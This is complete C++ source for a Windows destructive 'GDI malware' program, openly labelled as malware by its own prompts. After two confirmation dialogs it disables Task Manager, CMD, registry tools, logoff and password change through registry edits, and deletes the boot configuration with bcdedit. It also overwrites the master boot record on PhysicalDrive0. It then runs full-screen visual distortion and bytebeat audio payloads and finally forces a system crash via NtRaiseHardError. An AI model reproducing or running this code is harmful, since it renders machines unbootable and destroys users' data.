#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include "bootheader.h"
#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
//	0x80000018
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}

void HSLtoRGB(float H, float S, float L, BYTE& R, BYTE& G, BYTE& B) {
	float C = (1.0f - fabs(2.0f * L - 1.0f)) * S;
	float X = C * (1.0f - fabs(fmod(H / 60.0f, 2) - 1.0f));
	float m = L - C / 2.0f;
	float r, g, b;

	if (0 <= H && H < 60) {
		r = C, g = X, b = 0;
	}
	else if (60 <= H && H < 120) {
		r = X, g = C, b = 0;
	}
	else if (120 <= H && H < 180) {
		r = 0, g = C, b = X;
	}
	else if (180 <= H && H < 240) {
		r = 0, g = X, b = C;
	}
	else if (240 <= H && H < 300) {
		r = X, g = 0, b = C;
	}
	else {
		r = C, g = 0, b = X;
	}

	R = (BYTE)((r + m) * 255);
	G = (BYTE)((g + m) * 255);
	B = (BYTE)((b + m) * 255);
}

//another HSL Function made by ChatGPT
//------------------------------------//
//This is Pankoza's Code I take it and modified as my own I will explain it here what i modified pankoza's code or the code i made by myself
//Some others payloads are made by Null_Y317K Thanks to her
DWORD WINAPI shader1(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Set the RGB color based on the desired logic
				rgbquad[index].rgbRed = (x + i) % 256;
				rgbquad[index].rgbGreen = (y + i) % 256;
				rgbquad[index].rgbBlue = ((x + y) / 2 + i) % 256;
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}

	DeleteDC(hdcCopy);
	DeleteObject(bmp);

	return 0x00;
}

DWORD WINAPI pixelate(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);

	while (1)
	{
		hdc = GetDC(0);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		SetStretchBltMode(hdc, COLORONCOLOR);

		StretchBlt(hdcCopy, 0, 0, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 3, h / 3, SRCCOPY);

		//if (rand() % 5 == 4) StretchBlt(hdc, 1, 1, w, h, hdc, 0, 0, w, h, SRCAND);
		ReleaseDC(0, hdc);
		Sleep(10);
	}

	return 0x00;
}
VOID WINAPI ci2(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateRectRgn(x, y, w + x, h + y); // Create a rectangular region
	SelectClipRgn(hdc, hrgn);

	// Generate a random color
	int r = rand() % 256;
	int g = rand() % 256;
	int b = rand() % 256;
	HBRUSH brush = CreateSolidBrush(RGB(r, g, b));
	SelectObject(hdc, brush);

	BitBlt(hdc, x, y, w, h, hdc, x, y, 0x2837E28);

	DeleteObject(hrgn);
	DeleteObject(brush);
	ReleaseDC(NULL, hdc);
	Sleep(1);
}

DWORD WINAPI wef2(LPVOID lpParam)
{
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	srand((unsigned int)time(NULL)); // Seed the random number generator

	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2;
		int y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci2(x - i / 2, y - i / 2, i, i);
		}
	}
	return 0;
}

DWORD WINAPI shader2(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Bytebeat formula for generating color values
				int t = i + x + y;
				int value = t ^ (t ^ t >> 4 | t + t >> 7);

				// Set RGB components based on the value
				rgbquad[index].rgbRed = (value >> 16) & 0xFF;
				rgbquad[index].rgbGreen = (value >> 8) & 0xFF;
				rgbquad[index].rgbBlue = value & 0xFF;
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}

	DeleteDC(hdcCopy);
	DeleteObject(bmp);

	return 0x00;
}

DWORD WINAPI shader3(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Moving red background
				int redValue = ((x + i) % 256) / 2 + 127;
				rgbquad[index].rgbRed = redValue;
				rgbquad[index].rgbGreen = 0;
				rgbquad[index].rgbBlue = 0;

				// XOR fractal
				if ((x ^ y) % 256 < 128) {
					rgbquad[index].rgbRed = 255;
					rgbquad[index].rgbGreen = 255;
					rgbquad[index].rgbBlue = 0;
				}
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}

	DeleteDC(hdcCopy);
	DeleteObject(bmp);

	return 0x00;
}

DWORD WINAPI shader4(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Calculate HSL values
				float H = (float)((i + y) % 360); // Hue changes over time and vertical position
				float S = 1.0f; // Full saturation
				float L = 0.5f; // Mid lightness

								// Convert HSL to RGB
				BYTE R, G, B;
				HSLtoRGB(H, S, L, R, G, B);

				// Apply the XOR fractal effect
				if ((x ^ y) % 256 < 128) {
					rgbquad[index].rgbRed = R;
					rgbquad[index].rgbGreen = G;
					rgbquad[index].rgbBlue = B;
				}
				else {
					rgbquad[index].rgbRed = 0;
					rgbquad[index].rgbGreen = 0;
					rgbquad[index].rgbBlue = 0;
				}
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}

	DeleteDC(hdcCopy);
	DeleteObject(bmp);

	return 0x00;
}

DWORD WINAPI shader5(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Bytebeat formula for generating color values
				int t = i + x + y;
				int value = t ^ (t ^ t >> 4 | t + t >> 7);

				// Set RGB components based on the HSL conversion
				float H = (float)((i + y) % 360); // Hue changes over time and vertical position
				float S = 1.0f; // Full saturation
				float L = 0.5f; // Mid lightness

				BYTE R, G, B;
				HSLtoRGB(H, S, L, R, G, B);

				rgbquad[index].rgbRed = R;
				rgbquad[index].rgbGreen = G;
				rgbquad[index].rgbBlue = B;
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}

	DeleteDC(hdcCopy);
	DeleteObject(bmp);

	return 0x00;
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(2 * (-t >> 6 & t) - (-t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(2 * (-t >> 6 & t) - (-t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ (t^t >> 4 | t + t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + (t >> 4 | t * t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//10*(t&t>>5)|(t^t>>5)
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(10 * (t&t >> 5) | (t^t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*t ^ (t + (t >> 3 | t ^ t >> 5)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI last() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11000, 11000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & (t >> (t >> 12 & 15)) * t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI blur5(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		//BitBlt(dcCopy, -1, -1, w, h, hdc, 0, 0, SRCCOPY);
		StretchBlt(dcCopy, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI Disabler(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI aerror(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"378946UGHDYTQ038964RUIH3IUJHFNP937F[37RI7587369(*@^(*&)%$(#^trgkceofph$#yril &d #uiety(*&t fiu#wdyb *#t(&tdf jhwg#diu#% r$*#&itf* b#*&$r+_dps{dpo kladuiewgr VDF", L"Text", MB_ICONQUESTION);
	}
	return 0;
}

void reg_add( //credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"Run Malware?", L"KMS 83624+.34624.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure?", L"KMS 83624+.34624.exe - Final Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			CreateThread(0, 0, Disabler, 0, 0, 0);
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			Sleep(5000);
			CreateThread(0, 0, aerror, 0, 0, 0);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(10000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
		    HANDLE thread2 = CreateThread(0, 0, pixelate, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, wef2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2);
			CloseHandle(thread2dot1);
			HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			HANDLE thread7 = CreateThread(0, 0, blur5, 0, 0, 0);
			last();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0x80000018, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
